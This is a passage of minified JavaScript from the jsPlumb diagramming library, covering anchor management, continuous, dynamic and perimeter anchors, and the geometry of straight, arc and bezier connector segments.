c=_.endpointHoverStyles[d]||_.endpointHoverStyle||n.Defaults.EndpointHoverStyles[d]||t.Defaults.EndpointHoverStyles[d]||n.Defaults.EndpointHoverStyle||t.Defaults.EndpointHoverStyle;null!=_.hoverPaintStyle&&(null==c&&(c={}),null==c.fill&&(c.fill=_.hoverPaintStyle.stroke));var B=_.anchors?_.anchors[d]:_.anchor?_.anchor:i(n.Defaults.Anchors[d],a,n)||i(t.Defaults.Anchors[d],a,n)||i(n.Defaults.Anchor,a,n)||i(t.Defaults.Anchor,a,n);w=e({paintStyle:u,hoverPaintStyle:c,endpoint:l,connections:[o],uuid:_.uuids?_.uuids[d]:null,anchor:B,source:s,scope:_.scope,reattach:_.reattach||n.Defaults.ReattachConnections,detachable:_.detachable||n.Defaults.ConnectionsDetachable}),null==r&&w.setDeleteOnEmpty(!0),o.endpoints[d]=w,!1===_.drawEndpoints&&w.setVisible(!1,!0,!0)}return w}})}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumbUtil,e=n.jsPlumb;e.AnchorManager=function(n){var o={},i={},r={},d={},_="identity",s=["left","top","right","bottom"],a={},w=this,l={},u=n.jsPlumbInstance,c={},B=function(n,t,e,o,i,r){if(n===t)return{orientation:_,a:["top","top"]};var d=Math.atan2(o.centery-e.centery,o.centerx-e.centerx),a=Math.atan2(e.centery-o.centery,e.centerx-o.centerx),w=[],l={};!function(n,t){for(var e=0;e<n.length;e++)l[n[e]]={left:[t[e].left,t[e].centery],right:[t[e].right,t[e].centery],top:[t[e].centerx,t[e].top],bottom:[t[e].centerx,t[e].bottom]}}(["source","target"],[e,o]);for(var u=0;u<s.length;u++)for(var c=0;c<s.length;c++)w.push({source:s[u],target:s[c],dist:Biltong.lineLength(l.source[s[u]],l.target[s[c]])});w.sort(function(n,t){return n.dist<t.dist?-1:n.dist>t.dist?1:0});for(var B=w[0].source,h=w[0].target,j=0;j<w.length&&(B=!i.isContinuous||i.isEdgeSupported(w[j].source)?w[j].source:null,h=!r.isContinuous||r.isEdgeSupported(w[j].target)?w[j].target:null,null==B||null==h);j++);return i.isContinuous&&i.setCurrentFace(B),r.isContinuous&&r.setCurrentFace(h),{a:[B,h],theta:d,theta2:a}},h=function(n){return function(t,e){return!1===(n?t[0][0]<e[0][0]:t[0][0]>e[0][0])?-1:1}},j={top:function(n,t){return n[0]>t[0]?1:-1},right:h(!0),bottom:h(!0),left:function(n,t){return(n[0][0]<0?-Math.PI-n[0][0]:Math.PI-n[0][0])>(t[0][0]<0?-Math.PI-t[0][0]:Math.PI-t[0][0])?1:-1}},p=function(n,t){var e=u.getCachedData(n),o=e.s,r=e.o,_=function(t,e,o,r,_,s,a){if(r.length>0)for(var w=function(n,t,e,o,i,r,d){for(var _=[],s=t[i?0:1]/(o.length+1),a=0;a<o.length;a++){var w=(a+1)*s,l=r*t[i?1:0];d&&(w=t[i?0:1]-w);var u=i?w:l,c=e[0]+u,B=u/t[0],h=i?l:w,j=e[1]+h,p=h/t[1];_.push([c,j,B,p,o[a][1],o[a][2]])}return _}(0,e,o,function(n,t){return n.sort(t)}(r,j[t]),_,s,"right"===t||"top"===t),l=function(n,t){i[n.id]=[t[0],t[1],t[2],t[3]],d[n.id]=a},u=0;u<w.length;u++){var c=w[u][4],B=c.endpoints[0].elementId===n,h=c.endpoints[1].elementId===n;B&&l(c.endpoints[0],w[u]),h&&l(c.endpoints[1],w[u])}};_("bottom",o,[r.left,r.top],t.bottom,!0,1,[0,1]),_("top",o,[r.left,r.top],t.top,!0,0,[0,-1]),_("left",o,[r.left,r.top],t.left,!1,0,[-1,0]),_("right",o,[r.left,r.top],t.right,!1,1,[1,0])};this.reset=function(){o={},a={},l={}},this.addFloatingConnection=function(n,t){c[n]=t},this.removeFloatingConnection=function(n){delete c[n]},this.newConnection=function(n){var o=n.sourceId,i=n.targetId,r=n.endpoints,d=!0,_=function(_,s,w,l,u){o===i&&w.isContinuous&&(n._jsPlumb.instance.removeElement(r[1].canvas),d=!1),t.addToList(a,l,[u,s,w.constructor===e.DynamicAnchor])};_(0,r[0],r[0].anchor,i,n),d&&_(0,r[1],r[1].anchor,o,n)};var f=function(n){!function(n,e){if(n){var o=function(n){return n[4]===e};t.removeWithFunction(n.top,o),t.removeWithFunction(n.left,o),t.removeWithFunction(n.bottom,o),t.removeWithFunction(n.right,o)}}(l[n.elementId],n.id)};this.connectionDetached=function(n,e){var o=n.connection||n,i=n.sourceId,r=n.targetId,d=o.endpoints,_=function(n,e,o,i,r){t.removeWithFunction(a[i],function(n){return n[0].id===r.id})};_(0,d[1],d[1].anchor,i,o),_(0,d[0],d[0].anchor,r,o),o.floatingId&&(_(o.floatingIndex,o.floatingEndpoint,o.floatingEndpoint.anchor,o.floatingId,o),f(o.floatingEndpoint)),f(o.endpoints[0]),f(o.endpoints[1]),e||(w.redraw(o.sourceId),o.targetId!==o.sourceId&&w.redraw(o.targetId))},this.add=function(n,e){t.addToList(o,e,n)},this.changeId=function(n,t){a[t]=a[n],o[t]=o[n],delete a[n],delete o[n]},this.getConnectionsFor=function(n){return a[n]||[]},this.getEndpointsFor=function(n){return o[n]||[]},this.deleteEndpoint=function(n){t.removeWithFunction(o[n.elementId],function(t){return t.id===n.id}),f(n)},this.clearFor=function(n){delete o[n],o[n]=[]};var g=function(e,o,i,r,d,_,s,a,w,l,u,c){var B,h,j=-1,p=r.endpoints[s],f=p.id,g=[1,0][s],m=[[o,i],r,d,_,f],v=e[w],C=p._continuousAnchorEdge?e[p._continuousAnchorEdge]:null;if(C){var b=t.findWithFunction(C,function(n){return n[4]===f});if(-1!==b)for(C.splice(b,1),B=0;B<C.length;B++)h=C[B][1],t.addWithFunction(u,h,function(n){return n.id===h.id}),t.addWithFunction(c,C[B][1].endpoints[s],function(n){return n.id===h.endpoints[s].id}),t.addWithFunction(c,C[B][1].endpoints[g],function(n){return n.id===h.endpoints[g].id})}for(B=0;B<v.length;B++)h=v[B][1],1===n.idx&&v[B][3]===_&&-1===j&&(j=B),t.addWithFunction(u,h,function(n){return n.id===h.id}),t.addWithFunction(c,v[B][1].endpoints[s],function(n){return n.id===h.endpoints[s].id}),t.addWithFunction(c,v[B][1].endpoints[g],function(n){return n.id===h.endpoints[g].id});var y=a?-1!==j?j:0:v.length;v.splice(y,0,m),p._continuousAnchorEdge=w};this.updateOtherEndpoint=function(n,o,i,r){var d=t.findWithFunction(a[n],function(n){return n[0].id===r.id}),_=t.findWithFunction(a[o],function(n){return n[0].id===r.id});-1!==d&&(a[n][d][0]=r,a[n][d][1]=r.endpoints[1],a[n][d][2]=r.endpoints[1].anchor.constructor===e.DynamicAnchor),_>-1&&(a[o].splice(_,1),t.addToList(a,i,[r,r.endpoints[0],r.endpoints[0].anchor.constructor===e.DynamicAnchor])),r.updateConnectedClass()},this.sourceChanged=function(n,o,i,r){if(n!==o){i.sourceId=o,i.source=r,t.removeWithFunction(a[n],function(n){return n[0].id===i.id});var d=t.findWithFunction(a[i.targetId],function(n){return n[0].id===i.id});d>-1&&(a[i.targetId][d][0]=i,a[i.targetId][d][1]=i.endpoints[0],a[i.targetId][d][2]=i.endpoints[0].anchor.constructor===e.DynamicAnchor),t.addToList(a,o,[i,i.endpoints[1],i.endpoints[1].anchor.constructor===e.DynamicAnchor]),i.endpoints[1].anchor.isContinuous&&(i.source===i.target?i._jsPlumb.instance.removeElement(i.endpoints[1].canvas):null==i.endpoints[1].canvas.parentNode&&i._jsPlumb.instance.appendElement(i.endpoints[1].canvas)),i.updateConnectedClass()}},this.rehomeEndpoint=function(n,t,e){var i=o[t]||[],r=u.getId(e);if(r!==t){var d=i.indexOf(n);if(d>-1){var _=i.splice(d,1)[0];w.add(_,r)}}for(var s=0;s<n.connections.length;s++)n.connections[s].sourceId===t?w.sourceChanged(t,n.elementId,n.connections[s],n.element):n.connections[s].targetId===t&&(n.connections[s].targetId=n.elementId,n.connections[s].target=n.element,w.updateOtherEndpoint(n.connections[s].sourceId,t,n.elementId,n.connections[s]))},this.redraw=function(n,i,r,d,_,s){if(!u.isSuspendDrawing()){var w=o[n]||[],h=a[n]||[],j=[],f=[],m=[];r=r||u.timestamp(),d=d||{left:0,top:0},i&&(i={left:i.left+d.left,top:i.top+d.top});for(var v=u.updateOffset({elId:n,offset:i,recalc:!1,timestamp:r}),C={},b=0;b<h.length;b++){var y=h[b][0],D=y.sourceId,P=y.targetId,E=y.endpoints[0].anchor.isContinuous,x=y.endpoints[1].anchor.isContinuous;if(E||x){var A=D+"_"+P,S=C[A],I=y.sourceId===n?1:0;E&&!l[D]&&(l[D]={top:[],right:[],bottom:[],left:[]}),x&&!l[P]&&(l[P]={top:[],right:[],bottom:[],left:[]}),n!==P&&u.updateOffset({elId:P,timestamp:r}),n!==D&&u.updateOffset({elId:D,timestamp:r});var k=u.getCachedData(P),T=u.getCachedData(D);P===D&&(E||x)?(g(l[D],-Math.PI/2,0,y,!1,P,0,!1,"top",0,j,f),g(l[P],-Math.PI/2,0,y,!1,D,1,!1,"top",0,j,f)):(S||(S=B(D,P,T.o,k.o,y.endpoints[0].anchor,y.endpoints[1].anchor),C[A]=S),E&&g(l[D],S.theta,0,y,!1,P,0,!1,S.a[0],0,j,f),x&&g(l[P],S.theta2,-1,y,!0,D,1,!0,S.a[1],0,j,f)),E&&t.addWithFunction(m,D,function(n){return n===D}),x&&t.addWithFunction(m,P,function(n){return n===P}),t.addWithFunction(j,y,function(n){return n.id===y.id}),(E&&0===I||x&&1===I)&&t.addWithFunction(f,y.endpoints[I],function(n){return n.id===y.endpoints[I].id})}}for(b=0;b<w.length;b++)0===w[b].connections.length&&w[b].anchor.isContinuous&&(l[n]||(l[n]={top:[],right:[],bottom:[],left:[]}),g(l[n],-Math.PI/2,0,{endpoints:[w[b],w[b]],paint:function(){}},!1,n,0,!1,w[b].anchor.getDefaultFace(),0,j,f),t.addWithFunction(m,n,function(t){return t===n}));for(b=0;b<m.length;b++)p(m[b],l[m[b]]);for(b=0;b<w.length;b++)w[b].paint({timestamp:r,offset:v,dimensions:v.s,recalc:!0!==s});for(b=0;b<f.length;b++){var M=u.getCachedData(f[b].elementId);f[b].paint({timestamp:r,offset:M,dimensions:M.s})}for(b=0;b<h.length;b++){var N=h[b][1];if(N.anchor.constructor===e.DynamicAnchor){N.paint({elementWithPrecedence:n,timestamp:r}),t.addWithFunction(j,h[b][0],function(n){return n.id===h[b][0].id});for(var O=0;O<N.connections.length;O++)N.connections[O]!==h[b][0]&&t.addWithFunction(j,N.connections[O],function(n){return n.id===N.connections[O].id})}else t.addWithFunction(j,h[b][0],function(n){return n.id===h[b][0].id})}var F=c[n];for(F&&F.paint({timestamp:r,recalc:!1,elId:n}),b=0;b<j.length;b++)j[b].paint({elId:n,timestamp:r,recalc:!1,clearEdits:_})}};u.continuousAnchorFactory={get:function(n){return new function(n){t.EventGenerator.apply(this),this.type="Continuous",this.isDynamic=!0,this.isContinuous=!0;for(var e=n.faces||["top","right","bottom","left"],o=!(!1===n.clockwise),_={},s={top:"bottom",right:"left",left:"right",bottom:"top"},a={top:"right",right:"bottom",left:"top",bottom:"left"},w={top:"left",right:"top",left:"bottom",bottom:"right"},l=o?a:w,u=o?w:a,c=n.cssClass||"",B=null,h=null,j=["left","right"],p=["top","bottom"],f=null,g=0;g<e.length;g++)_[e[g]]=!0;this.getDefaultFace=function(){return 0===e.length?"top":e[0]},this.verifyEdge=function(n){return _[n]?n:_[s[n]]?s[n]:_[l[n]]?l[n]:_[u[n]]?u[n]:n},this.isEdgeSupported=function(n){return null==f?null==h?!0===_[n]:h===n:-1!==f.indexOf(n)},this.setCurrentFace=function(n){B=n},this.getCurrentFace=function(){return B},this.lockCurrentFace=function(){h=B},this.unlockCurrentFace=function(){h=null},this.lockCurrentAxis=function(){null!=B&&(f="left"===B||"right"===B?j:p)},this.unlockCurrentAxis=function(){f=null},this.compute=function(n){return r[n.element.id]||i[n.element.id]||[0,0]},this.getCurrentLocation=function(n){return r[n.element.id]||i[n.element.id]||[0,0]},this.getOrientation=function(n){return d[n.id]||[0,0]},this.clearUserDefinedLocation=function(){delete r[n.elementId]},this.setUserDefinedLocation=function(t){r[n.elementId]=t},this.getCssClass=function(){return c}}(n)},clear:function(n){delete r[n],delete i[n]}}},e.Anchor=function(n){this.x=n.x||0,this.y=n.y||0,this.elementId=n.elementId,this.cssClass=n.cssClass||"",this.userDefinedLocation=null,this.orientation=n.orientation||[0,0],this.lastReturnValue=null,this.offsets=n.offsets||[0,0],this.timestamp=null,t.EventGenerator.apply(this),this.compute=function(n){var t=n.xy,e=n.wh,o=n.timestamp;return n.clearUserDefinedLocation&&(this.userDefinedLocation=null),o&&o===this.timestamp?this.lastReturnValue:(null!=this.userDefinedLocation?this.lastReturnValue=this.userDefinedLocation:this.lastReturnValue=[t[0]+this.x*e[0]+this.offsets[0],t[1]+this.y*e[1]+this.offsets[1]],this.timestamp=o,this.lastReturnValue)},this.getCurrentLocation=function(n){return n=n||{},null==this.lastReturnValue||null!=n.timestamp&&this.timestamp!==n.timestamp?this.compute(n):this.lastReturnValue}},t.extend(e.Anchor,t.EventGenerator,{equals:function(n){if(!n)return!1;var t=n.getOrientation(),e=this.getOrientation();return this.x===n.x&&this.y===n.y&&this.offsets[0]===n.offsets[0]&&this.offsets[1]===n.offsets[1]&&e[0]===t[0]&&e[1]===t[1]},getUserDefinedLocation:function(){return this.userDefinedLocation},setUserDefinedLocation:function(n){this.userDefinedLocation=n},clearUserDefinedLocation:function(){this.userDefinedLocation=null},getOrientation:function(){return this.orientation},getCssClass:function(){return this.cssClass}}),e.FloatingAnchor=function(n){e.Anchor.apply(this,arguments);var t=n.reference,o=n.referenceCanvas,i=e.getSize(o),r=null,d=null;this.orientation=null,this.x=0,this.y=0,this.isFloating=!0,this.compute=function(n){var t=n.xy,e=[t[0]+i[0]/2,t[1]+i[1]/2];return d=e,e},this.getOrientation=function(n){if(r)return r;var e=t.getOrientation(n);return[0*Math.abs(e[0])*-1,0*Math.abs(e[1])*-1]},this.over=function(n,t){r=n.getOrientation(t)},this.out=function(){r=null},this.getCurrentLocation=function(n){return null==d?this.compute(n):d}},t.extend(e.FloatingAnchor,e.Anchor);var o=function(n,t,o){return n.constructor===e.Anchor?n:t.makeAnchor(n,o,t)};e.DynamicAnchor=function(n){e.Anchor.apply(this,arguments),this.isDynamic=!0,this.anchors=[],this.elementId=n.elementId,this.jsPlumbInstance=n.jsPlumbInstance;for(var t=0;t<n.anchors.length;t++)this.anchors[t]=o(n.anchors[t],this.jsPlumbInstance,this.elementId);this.getAnchors=function(){return this.anchors},this.locked=!1;var i=this.anchors.length>0?this.anchors[0]:null,r=i,d=this,_=function(n,t,e,o,i){var r=o[0]+n.x*i[0],d=o[1]+n.y*i[1],_=o[0]+i[0]/2,s=o[1]+i[1]/2;return Math.sqrt(Math.pow(t-r,2)+Math.pow(e-d,2))+Math.sqrt(Math.pow(_-r,2)+Math.pow(s-d,2))},s=n.selector||function(n,t,e,o,i){for(var r=e[0]+o[0]/2,d=e[1]+o[1]/2,s=-1,a=1/0,w=0;w<i.length;w++){var l=_(i[w],r,d,n,t);l<a&&(s=w+0,a=l)}return i[s]};this.compute=function(n){var t=n.xy,e=n.wh,o=n.txy,_=n.twh;this.timestamp=n.timestamp;var a=d.getUserDefinedLocation();return null!=a?a:this.locked||null==o||null==_?i.compute(n):(n.timestamp=null,i=s(t,e,o,_,this.anchors),this.x=i.x,this.y=i.y,i!==r&&this.fire("anchorChanged",i),r=i,i.compute(n))},this.getCurrentLocation=function(n){return this.getUserDefinedLocation()||(null!=i?i.getCurrentLocation(n):null)},this.getOrientation=function(n){return null!=i?i.getOrientation(n):[0,0]},this.over=function(n,t){null!=i&&i.over(n,t)},this.out=function(){null!=i&&i.out()},this.getCssClass=function(){return i&&i.getCssClass()||""}},t.extend(e.DynamicAnchor,e.Anchor);var i=function(n,t,o,i,r,d){e.Anchors[r]=function(e){var _=e.jsPlumbInstance.makeAnchor([n,t,o,i,0,0],e.elementId,e.jsPlumbInstance);return _.type=r,d&&d(_,e),_}};i(.5,0,0,-1,"TopCenter"),i(.5,1,0,1,"BottomCenter"),i(0,.5,-1,0,"LeftMiddle"),i(1,.5,1,0,"RightMiddle"),i(.5,0,0,-1,"Top"),i(.5,1,0,1,"Bottom"),i(0,.5,-1,0,"Left"),i(1,.5,1,0,"Right"),i(.5,.5,0,0,"Center"),i(1,0,0,-1,"TopRight"),i(1,1,0,1,"BottomRight"),i(0,0,0,-1,"TopLeft"),i(0,1,0,1,"BottomLeft"),e.Defaults.DynamicAnchors=function(n){return n.jsPlumbInstance.makeAnchors(["TopCenter","RightMiddle","BottomCenter","LeftMiddle"],n.elementId,n.jsPlumbInstance)},e.Anchors.AutoDefault=function(n){var t=n.jsPlumbInstance.makeDynamicAnchor(e.Defaults.DynamicAnchors(n));return t.type="AutoDefault",t};var r=function(n,t){e.Anchors[n]=function(e){var o=e.jsPlumbInstance.makeAnchor(["Continuous",{faces:t}],e.elementId,e.jsPlumbInstance);return o.type=n,o}};e.Anchors.Continuous=function(n){return n.jsPlumbInstance.continuousAnchorFactory.get(n)},r("ContinuousLeft",["left"]),r("ContinuousTop",["top"]),r("ContinuousBottom",["bottom"]),r("ContinuousRight",["right"]),i(0,0,0,0,"Assign",function(n,t){var e=t.position||"Fixed";n.positionFinder=e.constructor===String?t.jsPlumbInstance.AnchorPositionFinders[e]:e,n.constructorParams=t}),n.jsPlumbInstance.prototype.AnchorPositionFinders={Fixed:function(n,t,e){return[(n.left-t.left)/e[0],(n.top-t.top)/e[1]]},Grid:function(n,t,e,o){var i=n.left-t.left,r=n.top-t.top,d=e[0]/o.grid[0],_=e[1]/o.grid[1],s=Math.floor(i/d),a=Math.floor(r/_);return[(s*d+d/2)/e[0],(a*_+_/2)/e[1]]}},e.Anchors.Perimeter=function(n){var t=(n=n||{}).anchorCount||60,e=n.shape;if(!e)throw new Error("no shape supplied to Perimeter Anchor type");var o=function(){for(var n=2*Math.PI/t,e=0,o=[],i=0;i<t;i++){var r=.5+.5*Math.sin(e),d=.5+.5*Math.cos(e);o.push([r,d,0,0]),e+=n}return o},i=function(n){for(var e=t/n.length,o=[],i=function(n,i,r,d,_){for(var s=(r-n)/(e=t*_),a=(d-i)/e,w=0;w<e;w++)o.push([n+s*w,i+a*w,0,0])},r=0;r<n.length;r++)i.apply(null,n[r]);return o},r=function(n){for(var t=[],e=0;e<n.length;e++)t.push([n[e][0],n[e][1],n[e][2],n[e][3],1/n.length]);return i(t)},d=function(){return r([[0,0,1,0],[1,0,1,1],[1,1,0,1],[0,1,0,0]])},_={Circle:o,Ellipse:o,Diamond:function(){return r([[.5,0,1,.5],[1,.5,.5,1],[.5,1,0,.5],[0,.5,.5,0]])},Rectangle:d,Square:d,Triangle:function(){return r([[.5,0,1,1],[1,1,0,1],[0,1,.5,0]])},Path:function(n){for(var t=n.points,e=[],o=0,r=0;r<t.length-1;r++){var d=Math.sqrt(Math.pow(t[r][2]-t[r][0])+Math.pow(t[r][3]-t[r][1]));o+=d,e.push([t[r][0],t[r][1],t[r+1][0],t[r+1][1],d])}for(var _=0;_<e.length;_++)e[_][4]=e[_][4]/o;return i(e)}};if(!_[e])throw new Error("Shape ["+e+"] is unknown by Perimeter Anchor type");var s=_[e](n);n.rotation&&(s=function(n,t){for(var e=[],o=t/180*Math.PI,i=0;i<n.length;i++){var r=n[i][0]-.5,d=n[i][1]-.5;e.push([r*Math.cos(o)-d*Math.sin(o)+.5,r*Math.sin(o)+d*Math.cos(o)+.5,n[i][2],n[i][3]])}return e}(s,n.rotation));var a=n.jsPlumbInstance.makeDynamicAnchor(s);return a.type="Perimeter",a}}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumb,e=n.jsPlumbUtil,o=n.Biltong;t.Segments={AbstractSegment:function(n){this.params=n,this.findClosestPointOnPath=function(n,t){return{d:1/0,x:null,y:null,l:null}},this.getBounds=function(){return{minX:Math.min(n.x1,n.x2),minY:Math.min(n.y1,n.y2),maxX:Math.max(n.x1,n.x2),maxY:Math.max(n.y1,n.y2)}}},Straight:function(n){var e,i,r,d,_,s,a,w=(t.Segments.AbstractSegment.apply(this,arguments),function(){e=Math.sqrt(Math.pow(_-d,2)+Math.pow(a-s,2)),i=o.gradient({x:d,y:s},{x:_,y:a}),r=-1/i});this.type="Straight",this.getLength=function(){return e},this.getGradient=function(){return i},this.getCoordinates=function(){return{x1:d,y1:s,x2:_,y2:a}},this.setCoordinates=function(n){d=n.x1,s=n.y1,_=n.x2,a=n.y2,w()},this.setCoordinates({x1:n.x1,y1:n.y1,x2:n.x2,y2:n.y2}),this.getBounds=function(){return{minX:Math.min(d,_),minY:Math.min(s,a),maxX:Math.max(d,_),maxY:Math.max(s,a)}},this.pointOnPath=function(n,t){if(0!==n||t){if(1!==n||t){var i=t?n>0?n:e+n:n*e;return o.pointOnLine({x:d,y:s},{x:_,y:a},i)}return{x:_,y:a}}return{x:d,y:s}},this.gradientAtPoint=function(n){return i},this.pointAlongPathFrom=function(n,t,e){var i=this.pointOnPath(n,e),r=t<=0?{x:d,y:s}:{x:_,y:a};return t<=0&&Math.abs(t)>1&&(t*=-1),o.pointOnLine(i,r,t)};var l=function(n,t,e){return e>=Math.min(n,t)&&e<=Math.max(n,t)},u=function(n,t,e){return Math.abs(e-n)<Math.abs(e-t)?n:t};this.findClosestPointOnPath=function(n,t){var w={d:1/0,x:null,y:null,l:null,x1:d,x2:_,y1:s,y2:a};if(0===i)w.y=s,w.x=l(d,_,n)?n:u(d,_,n);else if(i===1/0||i===-1/0)w.x=d,w.y=l(s,a,t)?t:u(s,a,t);else{var c=s-i*d,B=(t-r*n-c)/(i-r),h=i*B+c;w.x=l(d,_,B)?B:u(d,_,B),w.y=l(s,a,h)?h:u(s,a,h)}var j=o.lineLength([w.x,w.y],[d,s]);return w.d=o.lineLength([n,t],[w.x,w.y]),w.l=j/e,w}},Arc:function(n){var e=(t.Segments.AbstractSegment.apply(this,arguments),function(t,e){return o.theta([n.cx,n.cy],[t,e])}),i=function(n,t){if(n.anticlockwise){var e=n.startAngle<n.endAngle?n.startAngle+r:n.startAngle;return e-Math.abs(e-n.endAngle)*t}var o=n.endAngle<n.startAngle?n.endAngle+r:n.endAngle,i=Math.abs(o-n.startAngle);return n.startAngle+i*t},r=2*Math.PI;this.radius=n.r,this.anticlockwise=n.ac,this.type="Arc",n.startAngle&&n.endAngle?(this.startAngle=n.startAngle,this.endAngle=n.endAngle,this.x1=n.cx+this.radius*Math.cos(n.startAngle),this.y1=n.cy+this.radius*Math.sin(n.startAngle),this.x2=n.cx+this.radius*Math.cos(n.endAngle),this.y2=n.cy+this.radius*Math.sin(n.endAngle)):(this.startAngle=e(n.x1,n.y1),this.endAngle=e(n.x2,n.y2),this.x1=n.x1,this.y1=n.y1,this.x2=n.x2,this.y2=n.y2),this.endAngle<0&&(this.endAngle+=r),this.startAngle<0&&(this.startAngle+=r);var d=this.endAngle<this.startAngle?this.endAngle+r:this.endAngle;this.sweep=Math.abs(d-this.startAngle),this.anticlockwise&&(this.sweep=r-this.sweep);var _=2*Math.PI*this.radius,s=this.sweep/r,a=_*s;this.getLength=function(){return a},this.getBounds=function(){return{minX:n.cx-n.r,maxX:n.cx+n.r,minY:n.cy-n.r,maxY:n.cy+n.r}};var w=function(n){var t=Math.floor(n),e=Math.ceil(n);return n-t<1e-10?t:e-n<1e-10?e:n};this.pointOnPath=function(t,e){if(0===t)return{x:this.x1,y:this.y1,theta:this.startAngle};if(1===t)return{x:this.x2,y:this.y2,theta:this.endAngle};e&&(t/=a);var o=i(this,t),r=n.cx+n.r*Math.cos(o),d=n.cy+n.r*Math.sin(o);return{x:w(r),y:w(d),theta:o}},this.gradientAtPoint=function(t,e){var i=this.pointOnPath(t,e),r=o.normal([n.cx,n.cy],[i.x,i.y]);return this.anticlockwise||r!==1/0&&r!==-1/0||(r*=-1),r},this.pointAlongPathFrom=function(t,e,o){var i=this.pointOnPath(t,o),r=e/_*2*Math.PI,d=this.anticlockwise?-1:1,s=i.theta+d*r;return{x:n.cx+this.radius*Math.cos(s),y:n.cy+this.radius*Math.sin(s)}}},Bezier:function(e){this.curve=[{x:e.x1,y:e.y1},{x:e.cp1x,y:e.cp1y},{x:e.cp2x,y:e.cp2y},{x:e.x2,y:e.y2}],t.Segments.AbstractSegment.apply(this,arguments),this.bounds={minX:Math.min(e.x1,e.x2,e.cp1x,e.cp2x),minY:Math.min(e.y1,e.y2,e.cp1y,e.cp2y),maxX:Math.max(e.x1,e.x2,e.cp1x,e.cp2x),maxY:Math.max(e.y1,e.y2,e.cp1y,e.cp2y)},this.type="Bezier";var o=function(t,e,o){return o&&(e=n.jsBezier.locationAlongCurveFrom(t,e>0?0:1,e)),e};this.pointOnPath=function(t,e){return t=o(this.curve,t,e),n.jsBezier.pointOnCurve(this.curve,t)},this.gradientAtPoint=function(t,e){return t=o(this.curve,t,e),n.jsBezier.gradientAtPoint(this.curve,t)},this.pointAlongPathFrom=function(t,e,i){return t=o(this.curve,t,i),n.jsBezier.pointAlongCurveFrom(this.curve,t,e)},this.getLength=function(){return n.jsBezier.getLength(this.curve)},this.getBounds=function(){return this.bounds}}},t.SegmentRenderer={getPath:function(n){return{Straight:function(){var t=n.getCoordinates();return"M "+t.x1+" "+t.y1+" L "+t.x2+" "+t.y2},Bezier:function(){var t=n.params;return"M "+t.x1+" "+t.y1+" C "+t.cp1x+" "+t.cp1y+" "+t.cp2x+" "+t.cp2y+" "+t.x2+" "+t.y2},Arc:function(){var t=n.params,e=n.sweep>Math.PI?1:0,o=n.anticlockwise?0:1;return"M"+n.x1+" "+n.y1+" A "+n.radius+" "+t.r+" 0 "+e+","+o+" "+n.x2+" "+n.y2}}[n.type]()}};var i=function(){this.resetBounds=function(){this.bounds={minX:1/0,minY:1/0,maxX:-1/0,maxY:-1/0}},this.resetBounds()};t.Connectors.AbstractConnector=function(n){i.apply(this,arguments);var r=[],d=0,_=[],s=[],a=n.stub||0,w=e.isArray(a)?a[0]:a,l=e.isArray(a)?a[1]:a,u=n.gap||0,c=e.isArray(u)?u[0]:u,B=e.isArray(u)?u[1]:u,h=null,j=!1,p=null,f=null,g=!1!==n.editable&&null!=t.ConnectorEditors&&null!=t.ConnectorEditors[this.type],m=this.setGeometry=function(n,t){j=!t,f=n},v=this.getGeometry=function(){return f};this.getPathData=function(){for(var n="",e=0;e<r.length;e++)n+=t.SegmentRenderer.getPath(r[e]),n+=" ";return n},this.hasBeenEdited=function(){return j},this.isEditing=function(){return null!=this.editor&&this.editor.isActive()},this.setEditable=function(n){return g=!(!n||null==t.ConnectorEditors||null==t.ConnectorEditors[this.type]||null!=this.overrideSetEditable&&!this.overrideSetEditable())&&n},this.isEditable=function(){return g},this.findSegmentForPoint=function(n,t){for(var e={d:1/0,s:null,x:null,y:null,l:null},o=0;o<r.length;o++){var i=r[o].findClosestPointOnPath(n,t);i.d<e.d&&(e.d=i.d,e.l=i.l,e.x=i.x,e.y=i.y,e.s=r[o],e.x1=i.x1,e.x2=i.x2,e.y1=i.y1,e.y2=i.y2,e.index=o)}return e};var C=function(n,t){t&&(n=n>0?n/d:(d+n)/d);for(var e=_.length-1,o=1,i=0;i<_.length;i++)if(_[i][1]>=n){e=i,o=1===n?1:0===n?0:(n-_[i][0])/s[i];break}return{segment:r[e],proportion:o,index:e}};this.setSegments=function(n){h=[],d=0;for(var t=0;t<n.length;t++)h.push(n[t]),d+=n[t].getLength()},this.getLength=function(){return d};var b=function(n){this.strokeWidth=n.strokeWidth;var t=o.quadrant(n.sourcePos,n.targetPos),e=n.targetPos[0]<n.sourcePos[0],i=n.targetPos[1]<n.sourcePos[1],r=n.strokeWidth||1,d=n.sourceEndpoint.anchor.getOrientation(n.sourceEndpoint),_=n.targetEndpoint.anchor.getOrientation(n.targetEndpoint),s=e?n.targetPos[0]:n.sourcePos[0],a=i?n.targetPos[1]:n.sourcePos[1],u=Math.abs(n.targetPos[0]-n.sourcePos[0]),h=Math.abs(n.targetPos[1]-n.sourcePos[1]);if(0===d[0]&&0===d[1]||0===_[0]&&0===_[1]){var j=u>h?0:1,p=[1,0][j];_=[],(d=[])[j]=n.sourcePos[j]>n.targetPos[j]?-1:1,_[j]=n.sourcePos[j]>n.targetPos[j]?1:-1,d[p]=0,_[p]=0}var f=e?u+c*d[0]:c*d[0],g=i?h+c*d[1]:c*d[1],m=e?B*_[0]:u+B*_[0],v=i?B*_[1]:h+B*_[1],C=d[0]*_[0]+d[1]*_[1],b={sx:f,sy:g,tx:m,ty:v,lw:r,xSpan:Math.abs(m-f),ySpan:Math.abs(v-g),mx:(f+m)/2,my:(g+v)/2,so:d,to:_,x:s,y:a,w:u,h:h,segment:t,startStubX:f+d[0]*w,startStubY:g+d[1]*w,endStubX:m+_[0]*l,endStubY:v+_[1]*l,isXGreaterThanStubTimes2:Math.abs(f-m)>w+l,isYGreaterThanStubTimes2:Math.abs(g-v)>w+l,opposite:-1===C,perpendicular:0===C,orthogonal:1===C,sourceAxis:0===d[0]?"y":"x",points:[s,a,u,h,f,g,m,v],stubs:[w,l]};return b.anchorOrientation=b.opposite?"opposite":b.orthogonal?"orthogonal":"perpendicular",b};return this.getSegments=function(){return r},this.updateBounds=function(n){var t=n.getBounds();this.bounds.minX=Math.min(this.bounds.minX,t.minX),this.bounds.maxX=Math.max(this.bounds.maxX,t.maxX),this.bounds.minY=Math.min(this.bounds.minY,t.minY),this.bounds.maxY=Math.max(this.bounds.maxY,t.maxY)},this.pointOnPath=function(n,t){var e=C(n,t);return e.segment&&e.segment.pointOnPath(e.proportion,!1)||[0,0]},this.gradientAtPoint=function(n,t){var e=C(n,t);return 